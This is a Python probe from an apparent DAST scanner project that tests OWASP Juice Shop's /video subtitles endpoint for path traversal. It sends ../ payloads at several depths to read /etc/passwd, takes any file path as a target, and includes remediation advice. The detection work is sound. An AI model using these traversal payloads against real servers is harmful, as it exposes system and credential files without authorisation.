#!/usr/bin/env python3
# Author: Tim Rice <tim.j.rice@hackrange.com>
# Part of nextgen-dast. See README.md for license and overall architecture.
"""
Path traversal / command injection: video subtitle path leaks
filesystem files.

`GET /video?subtitles=...` is supposed to fetch a named subtitle
file from a fixed directory. When the parameter isn't sanitised, the
underlying `fs.readFile` honors `../`-traversal and returns arbitrary
file content. The Juice Shop build's payload is
`/video?subtitles=../../../../etc/passwd` — body comes back with a
`text/*` content type and the literal `root:x:0:0` of /etc/passwd.

Detection signal:
  GET /video?subtitles=<traversal-to-passwd> → body contains
  `root:x:0:0`. Same /etc/passwd marker the XXE probe uses.
"""
from __future__ import annotations

import re
import sys
from pathlib import Path
from urllib.parse import urljoin, urlparse

sys.path.insert(0, str(Path(__file__).parent.parent))
from lib import Probe, Verdict, SafeClient   # noqa: E402

VIDEO_PATH = "/video"
PASSWD_RE  = re.compile(r"\broot:x:0:0:")

# Increasing levels of traversal — apps host their static dir at
# different depths. We try a few prefixes; first hit wins.
TRAVERSAL_PREFIXES = (
    "../" * 4,
    "../" * 6,
    "../" * 8,
    "../" * 12,
)


class CmdiVideoSubtitlesProbe(Probe):
    name = "cmdi_video_subtitles"
    summary = ("Detects /video?subtitles=... path traversal returning "
               "/etc/passwd contents.")
    safety_class = "read-only"

    def add_args(self, parser):
        parser.add_argument(
            "--target-file", default="etc/passwd",
            help="Filesystem path (relative, no leading slash) to "
                 "attempt to read (default etc/passwd).")

    def run(self, args, client: SafeClient) -> Verdict:
        if not args.url:
            return Verdict(ok=False, error="--url is required")
        parsed = urlparse(args.url)
        origin = f"{parsed.scheme}://{parsed.netloc}"
        target = (args.target_file or "etc/passwd").lstrip("/")

        attempts: list[dict] = []
        confirmed: dict | None = None
        for prefix in TRAVERSAL_PREFIXES:
            url = urljoin(origin,
                          f"{VIDEO_PATH}?subtitles={prefix}{target}")
            r = client.request("GET", url)
            row: dict = {"url": url, "status": r.status, "size": r.size,
                         "prefix_depth": prefix.count("../")}
            if r.body and PASSWD_RE.search(r.text):
                row["leaked"] = True
                confirmed = row
                attempts.append(row)
                break
            attempts.append(row)

        evidence = {"origin": origin, "attempts": attempts}
        if confirmed:
            return Verdict(
                validated=True, confidence=0.97,
                summary=(f"Confirmed: subtitle path-traversal at "
                         f"{confirmed['url']} — response contains the "
                         f"first line of /etc/passwd."),
                evidence={**evidence, "confirmed": confirmed},
                severity_uplift="critical",
                remediation=(
                    "Resolve the supplied filename with `path.basename`, "
                    "discarding any directory component, then check "
                    "the resolved file is inside the subtitles "
                    "directory (compare via `path.resolve` against the "
                    "allowed root). Refuse anything outside. The "
                    "`subtitles` parameter should also enumerate-only "
                    "(allowlist of known subtitle file names) where "
                    "feasible — that closes the bug class entirely."),
            )
        return Verdict(
            validated=False, confidence=0.85,
            summary=(f"Refuted: tested {len(attempts)} traversal "
                     f"depths against /video on {origin}; none "
                     "returned /etc/passwd content."),
            evidence=evidence,
        )


if __name__ == "__main__":
    CmdiVideoSubtitlesProbe().main()
